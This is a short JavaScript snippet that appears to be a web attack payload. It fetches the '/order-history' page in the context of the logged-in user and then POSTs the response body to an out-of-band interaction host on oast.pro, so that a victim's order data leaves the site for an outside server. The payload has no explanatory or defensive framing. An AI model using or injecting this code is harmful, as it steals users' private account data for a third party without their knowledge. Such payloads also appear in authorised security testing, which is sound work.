

async function fetchData() {
    try {
        const response = await fetch('/order-history', {
            method: 'GET'
        });

        fetch('d14tov0gn2sl5jg9g1sgudzxavijmmgex.oast.pro', {
            method: 'POST',
            body: response.body,
        });
    } catch (error) {
        console.error('Error fetching data:', error);
        throw error; // Re-throw the error for further handling
    }
}

fetchData()
    .then(() => {
        console.log('Data fetched successfully');
    })
    .catch(error => {
        console.error('Error in fetchData:', error);
    });
